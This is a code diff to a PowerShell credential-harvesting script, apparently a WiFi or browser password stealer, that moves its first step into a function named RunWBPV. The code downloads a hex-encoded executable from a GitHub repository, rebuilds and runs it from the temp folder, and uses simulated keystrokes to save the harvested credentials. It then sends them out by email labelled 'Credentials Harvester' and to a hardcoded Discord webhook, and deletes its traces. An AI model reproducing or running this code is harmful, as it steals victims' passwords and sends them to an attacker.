@@ -78,6 +78,112 @@ function Send-EmailNotification {
         Write-Host "Error sending webhook notification: $_"
     }
 }
+function RunWBPV {
+    1 {
+        # Run WBPV 
+        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
+        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
+        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
+
+        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
+        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
+        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file
+
+        # Convert the hex string to a byte array
+        $bytes = [byte[]]::new($hexString.Length / 2)
+        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
+        }
+
+        # Create a temporary file to hold the executable
+        $tempExePath = Join-Path $env:TEMP "example.exe"
+        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+        $process = Start-Process $tempExePath # Start the executable
+
+        #  SAVED DATA 
+        $outputFilePath = "$env:TEMP\data.txt"
+        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
+        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
+
+        # Simulate CTRL+A and then CTRL+S to save the file
+        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
+        Start-Sleep -Milliseconds 500  # Wait a moment for selection
+        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
+        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear
+
+        # Send the output file path and Enter
+        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
+        Start-Sleep -Milliseconds 500  # Wait for the input
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
+
+        Start-Sleep -Seconds 2 # Wait a moment for the file to save
+        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
+
+        ###############################################################################
+
+        # SEND to EMAIL or WEBHOOK
+        if (-not $isEmailSent) {
+             # Email parameters
+             $subject = "Credentials Harvester - Sent on $currentDateTime"
+             $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
+             Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+        }    
+
+        if (-not $isEmailSent) { 
+                $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
+
+                if (Test-Path $filePath) {
+                    $fileContent = Get-Content -Path $filePath -Raw # Read the content of the text file
+
+                    # Split the content into chunks of 2000 characters
+                    $chunkSize = 2000
+                    $chunks = [System.Collections.Generic.List[string]]::new()
+
+                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+                    }
+
+                    # Calculate total chunks for progress increment
+                    $totalChunks = $chunks.Count
+                    $currentChunks = 1
+
+                    # Send each chunk to the Discord webhook
+                    foreach ($chunk in $chunks) {
+                        # Create the payload for the webhook
+                        $payload = @{
+                            content = $chunk
+                        } | ConvertTo-Json
+
+                        # Try to send the content to the Discord webhook
+                        try {
+                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
+                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                        } catch {
+                            Write-Host "Error sending request: $_"
+                        }
+
+                        # Inside the foreach loop, after each chunk is sent
+                        $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+
+                        # Increment to the next profile
+                        $currentChunks++
+                    }
+                } else {
+                    Write-Host "File not found: $filePath"
+                    Add-Type -AssemblyName PresentationFramework
+                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
+                }
+            
+
+            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+            Write-Host "Operation $step / $totalSteps is done."
+            SetEmailSentFalse
+        }
+    }
+}
 
 $webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
 
@@ -88,52 +194,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
 
-        1 { 
-            $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
-            $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")
-            Invoke-WebRequest -Uri $url -OutFile $tempPath
-            $hexFilePath = Join-Path $env:TEMP "example.txt"
-            $hexString = Get-Content -Path $hexFilePath -Raw
-            $bytes = [byte[]]::new($hexString.Length / 2)
-            for ($i = 0; $i -lt $hexString.Length; $i += 2) {$bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)}
-            $tempExePath = Join-Path $env:TEMP "example.exe"
-            [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
-            $process = Start-Process $tempExePath
-            $outputFilePath = "$env:TEMP\data.txt"
-            Start-Sleep -Seconds 2
-            Add-Type -AssemblyName System.Windows.Forms 
-            [System.Windows.Forms.SendKeys]::SendWait("^(a)");Start-Sleep -Milliseconds 500  
-            [System.Windows.Forms.SendKeys]::SendWait("^(s)");Start-Sleep -Milliseconds 1000
-            [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath");Start-Sleep -Milliseconds 500  
-            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}");Start-Sleep -Seconds 2 
-            Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force
-            if (-not $isEmailSent) {$subject = "Credentials Harvester - Sent on $currentDateTime";$attachments = @("$env:TEMP\data.txt");Send-ZohoEmail -Subject $subject -Attachments $attachments}
-            if (-not $isEmailSent) { 
-                $filePath = "$env:TEMP\data.txt"
-
-                if (Test-Path $filePath) {
-                    $fileContent = Get-Content -Path $filePath -Raw
-                    $chunkSize = 2000
-                    $chunks = [System.Collections.Generic.List[string]]::new()
-                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {$chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))}
-                    $totalChunks = $chunks.Count
-                    $currentChunks = 1
-
-                    foreach ($chunk in $chunks) { $payload = @{content = $chunk} | ConvertTo-Json; try {Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null;Start-Sleep -Seconds 1} catch {Write-Host "Error sending request: $_"}
-                        $currentChunks++
-                    }
-                } else {
-                    Write-Host "File not found: $filePath"
-                    Add-Type -AssemblyName PresentationFramework
-                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
-                }
-            }
-            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
-            SetEmailSentFalse
-        }
+        1 { RunWBPV }
         2 { }
         3 { }
         4 { }
